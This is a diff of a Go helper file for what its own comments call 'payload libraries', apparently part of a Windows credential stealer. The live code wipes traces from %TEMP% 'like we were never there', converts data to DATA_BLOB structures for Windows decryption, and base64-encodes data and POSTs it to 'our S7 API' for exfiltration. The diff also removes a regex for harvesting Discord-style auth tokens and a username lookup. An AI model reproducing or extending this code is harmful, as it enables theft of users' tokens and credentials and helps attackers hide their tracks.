@@ -1,17 +1,14 @@
 package main
 
+// This file contains a list of shared dependency functions across the different payload libraries.
+
 import (
 	"encoding/base64"
-	"encoding/json"
 	"errors"
-	"fmt"
 	"io"
-	"log"
 	"math/rand"
 	"os"
 	"os/exec"
-	"os/user"
-	"regexp"
 	"strings"
 	"time"
 	"unsafe"
@@ -42,10 +39,13 @@ type DATA_BLOB struct {
 	pbData *byte
 }
 
+// everything that is too large to be stored in ram, gets stored in the %TEMP% directory
+// this function removes our scraps from %TEMP% (like we were never there)
 func CleanUp() {
 	_ = os.RemoveAll(TEMPFILEDIR)
 }
 
+// returns a boolean representing a file's existence on the system
 func FileExists(filePath string) bool {
 	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
 	if errors.Is(err, os.ErrNotExist) {
@@ -55,6 +55,7 @@ func FileExists(filePath string) bool {
 	}
 }
 
+// converts a byte array to a windows native DATA_BLOB type
 func NewBlob(d []byte) *DATA_BLOB {
 	if len(d) == 0 {
 		return &DATA_BLOB{}
@@ -65,12 +66,14 @@ func NewBlob(d []byte) *DATA_BLOB {
 	}
 }
 
+// converts a windows native DATA_BLOB type to a byte array
 func (b *DATA_BLOB) ToByteArray() []byte {
 	d := make([]byte, b.cbData)
 	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
 	return d
 }
 
+// self-explanatory, copies `pathSourceFile` to `pathDestFile`
 func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
 	sourceFile, err := os.Open(pathSourceFile)
 	if err != nil {
@@ -111,6 +114,7 @@ func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
 	return nil
 }
 
+// sends an http POST request to our S7 API
 func SendRequest(body string) {
 
 	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")
@@ -126,67 +130,7 @@ func SendRequest(body string) {
 
 }
 
-func GetUsername() string {
-	user, err := user.Current()
-	if err != nil {
-		log.Fatalf(err.Error())
-	}
-
-	if strings.Contains(user.Username, "\\") {
-		return strings.Split(user.Username, "\\")[1]
-	} else {
-		return user.Username
-	}
-}
-
-func FindAllTokens(input string) []string {
-	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
-	if e != nil {
-		log.Fatalf(e.Error())
-	}
-
-	return Expression.FindAllString(input, -1)
-}
-
-func RemoveDuplicates[T string | int](sliceList []T) []T {
-	allKeys := make(map[T]bool)
-	list := []T{}
-	for _, item := range sliceList {
-		if _, value := allKeys[item]; !value {
-			allKeys[item] = true
-			list = append(list, item)
-		}
-	}
-	return list
-}
-
-func FormatTokens(input []string) string {
-	output, _ := json.Marshal(RemoveDuplicates(input))
-	return string(output)
-}
-
-func Slice(s string, chunkSize int) []string {
-	if len(s) == 0 {
-		return nil
-	}
-	if chunkSize >= len(s) {
-		return []string{s}
-	}
-	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
-	currentLen := 0
-	currentStart := 0
-	for i := range s {
-		if currentLen == chunkSize {
-			chunks = append(chunks, s[currentStart:i])
-			currentLen = 0
-			currentStart = i
-		}
-		currentLen++
-	}
-	chunks = append(chunks, s[currentStart:])
-	return chunks
-}
-
+// generates a random string of `n` length
 func RandStringBytes(n int) string {
 	rand.Seed(time.Now().UnixNano())
 
@@ -197,32 +141,13 @@ func RandStringBytes(n int) string {
 	return string(b)
 }
 
-func RandIntBytes(n int) string {
-	rand.Seed(time.Now().UnixNano())
-
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = numberBytes[rand.Intn(len(numberBytes))]
-	}
-	return string(b)
-}
-
-func RandRawBytes(n int) []byte {
-	rand.Seed(time.Now().UnixNano())
-
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = byte(rand.Intn(255))
-	}
-	return b
-}
-
-func GenerateHeaders() {
-	for i := 0; i < len(HEADERS); i++ {
-		HEADERS[i] = RandIntBytes(6)
-	}
-}
-
-func ToString(s interface{}) string {
-	return fmt.Sprint(s)
-}
+// unused
+//func RandIntBytes(n int) string {
+//	rand.Seed(time.Now().UnixNano())
+//
+//	b := make([]byte, n)
+//	for i := range b {
+//		b[i] = numberBytes[rand.Intn(len(numberBytes))]
+//	}
+//	return string(b)
+//}
